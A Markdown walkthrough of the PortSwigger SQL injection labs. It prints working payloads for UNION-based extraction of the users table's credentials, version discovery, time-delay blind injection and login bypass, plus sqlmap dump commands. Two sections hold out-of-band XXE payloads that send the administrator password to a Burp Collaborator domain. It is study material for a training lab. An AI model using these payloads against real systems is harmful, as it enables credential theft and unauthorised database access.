<!-- omit in toc -->
# SQL Injection

<!-- omit in toc -->
## Table of Contents

- [SQL injection UNION attack, determining the number of columns returned by the query](#sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query)
- [SQL injection UNION attack, finding a column containing text](#sql-injection-union-attack-finding-a-column-containing-text)
- [SQL injection UNION attack, retrieving data from other tables](#sql-injection-union-attack-retrieving-data-from-other-tables)
- [SQL injection UNION attack, retrieving multiple values in a single column](#sql-injection-union-attack-retrieving-multiple-values-in-a-single-column)
- [SQL injection attack, querying the database type and version on Oracle](#sql-injection-attack-querying-the-database-type-and-version-on-oracle)
- [SQL injection attack, querying the database type and version on MySQL and Microsoft](#sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft)
- [SQL injection attack, listing the database contents on non-Oracle databases](#sql-injection-attack-listing-the-database-contents-on-non-oracle-databases)
- [SQL injection attack, listing the database contents on Oracle](#sql-injection-attack-listing-the-database-contents-on-oracle)
- [Blind SQL injection with conditional responses](#blind-sql-injection-with-conditional-responses)
- [Blind SQL injection with conditional errors](#blind-sql-injection-with-conditional-errors)
- [Blind SQL injection with time delays](#blind-sql-injection-with-time-delays)
- [Blind SQL injection with time delays and information retrieval](#blind-sql-injection-with-time-delays-and-information-retrieval)
- [Blind SQL injection with out-of-band interaction](#blind-sql-injection-with-out-of-band-interaction)
- [Blind SQL injection with out-of-band data exfiltration](#blind-sql-injection-with-out-of-band-data-exfiltration)
- [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](#sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data)
- [Lab: SQL injection vulnerability allowing login bypass](#lab-sql-injection-vulnerability-allowing-login-bypass)
  
## SQL injection UNION attack, determining the number of columns returned by the query
### Reference: [PortSwigger: SQL injection UNION attack: Determining the number of columns](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

<!-- omit in toc -->
### Quick Solution
The ``category`` parameter is vulnerable to SQL Injection, use a **UNION** attack to retrieve the number of columns, the payload is simply:
```
# Keep adding NULL until the error disappears
'+UNION+SELECT+NULL,NULL--
```
<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the ``category`` parameter, giving it the value ``'+UNION+SELECT+NULL--``. Observe that an error occurs.
3. Modify the category parameter to add an additional column containing a null value: 
```
'+UNION+SELECT+NULL,NULL--
```
4. Continue adding null values until the error disappears and the response includes additional content containing the null values.

## SQL injection UNION attack, finding a column containing text
### Reference: [PortSwigger: SQL injection UNION attack: Finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

<!-- omit in toc -->
### Quick Solution
The ``category`` parameter is vulnerable to SQL Injection, combine the previous payload to retrieve the number of columns and then change the ``NULL`` value one by one with a random string to find a column that contains text. Payload in the next section

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the ``category`` parameter: 
```
'+UNION+SELECT+NULL,NULL,NULL--
```
3. Try replacing each null with the random value provided by the lab, for example: 
```
'+UNION+SELECT+'abcdef',NULL,NULL--
```
4. If an error occurs, move on to the next null and try that instead.

## SQL injection UNION attack, retrieving data from other tables
### Reference: [PortSwigger: SQL injection UNION attack: Retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

<!-- omit in toc -->
### Quick Solution
Use the previous payloads to retrieve the number of columns and which columns contain text data. The description says that there is a ``users`` table with columns called ``username`` and ``password``. Use the following payload to retrieve the contents of ``users`` table:
```
'+UNION+SELECT+username,+password+FROM+users--
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: 
```
'+UNION+SELECT+'abc','def'--.
```
3. Use the following payload to retrieve the contents of the users table: 
```
'+UNION+SELECT+username,+password+FROM+users--
```
4. Verify that the application's response contains usernames and passwords.

## SQL injection UNION attack, retrieving multiple values in a single column
### Reference: [PortSwigger: SQL injection UNION attack: Retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

<!-- omit in toc -->
### Quick Solution
The original query returns two colums, but only one contains text. Multiple values can be retrieved together including a suitable separator to let distinguish the combined values. The payload for this lab is the following:
```
' UNION SELECT username || '~' || password FROM users--
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the ``category`` parameter: 
```
'+UNION+SELECT+NULL,'abc'--
```
3. Use the following payload to retrieve the contents of the users table: 
```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```
4. Verify that the application's response contains usernames and passwords.

## SQL injection attack, querying the database type and version on Oracle
### Reference: [PortSwigger: SQL injection: Querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

<!-- omit in toc -->
### Quick Solution
Be aware that on Oracle databases every ``SELECT`` statement must specify a table to select ``FROM``. There is a built-in table on Oracle called ``dual`` which can be used for this purpose. After retrieving the number of columns and which column contains data the SQL Injection cheatsheet can be used to discover how to retrieve the version on Oracle databases. The payload is the following:
```
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: 
```
'+UNION+SELECT+'abc','def'+FROM+dual--
```
3. Use the following payload to display the database version: 
```
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

## SQL injection attack, querying the database type and version on MySQL and Microsoft
### Reference: [PortSwigger: SQL injection: Querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

<!-- omit in toc -->
### Quick Solution
This lab is similar to the ones before. The only difference is that it is mandatory to use Burp because seems impossible to inject the '#' character from the browser. The final payload is the following:
```
'+UNION+SELECT+@@version,+NULL#
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the ``category`` parameter: 
```
'+UNION+SELECT+'abc','def'#
```
3. Use the following payload to display the database version: 
```
'+UNION+SELECT+@@version,+NULL#
```

## SQL injection attack, listing the database contents on non-Oracle databases
### Reference: [PortSwigger: SQL injection: Listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents)

<!-- omit in toc -->
### Quick Solution
In this case a full attack must be completed. For this reason I used a tool to automate it: ``sqlmap``. To retrieve the credentials of the ``administrator`` I used the the following commands (I used the Dockerized version of ``sqlmap``):
```
# Get Databases
docker run -it --rm secsi/sqlmap -u "<target_url>" --dbs
# List tables in database
docker run -it --rm secsi/sqlmap -u "<target_url>" -D public --tables
# Dump content of a DB table
docker run -it --rm secsi/sqlmap -u "<target_url>" -D public -T <users_table_name> --dump
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the ``category`` parameter: 
```
'+UNION+SELECT+'abc','def'--.
```
3. Use the following payload to retrieve the list of tables in the database:
```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table: 
```
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
```
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
```
8. Find the password for the ``administrator`` user, and use it to log in.

## SQL injection attack, listing the database contents on Oracle
### Reference: [PortSwigger: SQL injection: Listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

<!-- omit in toc -->
### Quick Solution
The same applies for this lab with a little difference: ``Oracle`` DBMS is a little bit different when it comes to databases. So I used this commands:
```
# Get Tables
docker run -it --rm secsi/sqlmap -u "<target_url>" --tables
# Then I found the target table and runned
docker run -it --rm secsi/sqlmap -u "<target_url>" -T <users_table_name> --dump
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the ``category`` parameter:
```
'+UNION+SELECT+'abc','def'+FROM+dual--
```
3. Use the following payload to retrieve the list of tables in the database:
```
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table: 
```
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
```
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
```
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```
8. Find the password for the ``administrator`` user, and use it to log in.

## Blind SQL injection with conditional responses
### Reference: [PortSwigger: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

<!-- omit in toc -->
### Quick Solution
This time the SQL Injections resides in the ``TrackingId`` cookie. For this reason a different ``sqlmap`` command must be used:
```
# Detect tables
docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 --tables
# Dump the content of 'users' table (set DBMS to speed up the execution)
docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 -T users --dbms=postgresql --dump
```

<!-- omit in toc -->
### Solution
The solution is **extremely long** and it has not been copied, see the reference link.

## Blind SQL injection with conditional errors
### Reference: [PortSwigger: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

<!-- omit in toc -->
### Quick Solution
In this case the Database is Oracle. It is impossible to use either ``ALL_TABLES`` and ``ALL_TAB_COLUMNS`` to retrieve Database content. For this reason there are two alternative:
- Infer the existence of a ``users`` table
- Blindly detect all the table in the ``SYSTEM`` Database

Here is the code for both of them: 
```
# Blindly detect all the tables in the SYSTEM database
docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 --dump
# Dump the content of the users table
docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 -T users --dump
```

<!-- omit in toc -->
### Solution
The solution is **extremely long** and it has not been copied, see the reference link.

## Blind SQL injection with time delays
### Reference: [PortSwigger: Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

<!-- omit in toc -->
### Quick Solution
For this lab it is only needed to observe that the DB is vulnerable to SQL injection with time delay, see the solution in the next section.                          

<!-- omit in toc -->
### Solution
1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.
2. Modify the TrackingId cookie, changing it to: 
```
TrackingId=x'||pg_sleep(10)--
```
3. Submit the request and observe that the application takes 10 seconds to respond.

## Blind SQL injection with time delays and information retrieval
### Reference: [PortSwigger: Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

<!-- omit in toc -->
### Quick Solution
As in the previous lab the Database is vulnerable to **SQL Injection with time delays**. We can use the following commands to exploit the lab:
```
# Enumerate tables
docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 --dump
# Dump the content of the users table
docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 -T users --dump
```

<!-- omit in toc -->
### Solution
The solution is **extremely long** and it has not been copied, see the reference link.

## Blind SQL injection with out-of-band interaction
### Reference: [PortSwigger: Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-interaction)

<!-- omit in toc -->
### Quick Solution
This lab contains a blind SQL Injection vulnerability that has **no effect on the application's response**. For this reason an out-of-band interaction with an external domain must be triggered. I tried to use the ``--dns-domain`` option of ``sqlmap`` but it doesn't seems to work. That's probably because of my machine setup (Burp on WSL2 and sqlmap dockerized). For this lab skip to the solution.

<!-- omit in toc -->
### Solution
1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the ``TrackingId`` cookie.
2. Modify the ``TrackingId`` cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows: 
```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--.
```
The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use Burp Collaborator client to verify that your payload had indeed triggered a DNS lookup and potentially exploit this behavior to exfiltrate sensitive data from the application. We'll go over this technique in the next lab.

## Blind SQL injection with out-of-band data exfiltration
### Reference: [PortSwigger: Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

<!-- omit in toc -->
### Quick Solution
This lab contains a blind SQL Injection vulnerability that has **no effect on the application's response**. For this reason an out-of-band interaction with an external domain must be triggered. I tried to use the ``--dns-domain`` option of ``sqlmap`` but it doesn't seems to work. That's probably because of my machine setup (Burp on WSL2 and sqlmap dockerized). For this lab skip to the solution.

<!-- omit in toc -->
### Solution
1. Visit the front page of the shop, and use Burp Suite Professional to intercept and modify the request containing the ``TrackingId`` cookie.
2. Go to the Burp menu, and launch the Burp Collaborator client.
3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
4. Modify the ``TrackingId`` cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows: 
```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--.
```
5. Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.
6. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the ``administrator`` user should appear in the subdomain of the interaction, and you can view this within the Burp Collaborator client. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.
7. In your browser, click "My account" to open the login page. Use the password to log in as the ``administrator`` user.

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
### Reference: [PortSwigger: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

<!-- omit in toc -->
### Quick Solution
In this lab the payload is quite easy, the goal is to retrieve hidden items. See next section for the solution.

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the ``category`` parameter, giving it the value ``'+OR+1=1--``
3. Submit the request, and verify that the response now contains additional items.

## Lab: SQL injection vulnerability allowing login bypass
### Reference: [PortSwigger: SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

<!-- omit in toc -->
### Quick Solution
In this lab the payload is quite easy, the goal is to login as ``administrator``. See next section for the solution.

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the login request.
2. Modify the ``username`` parameter, giving it the value: ``administrator'--``
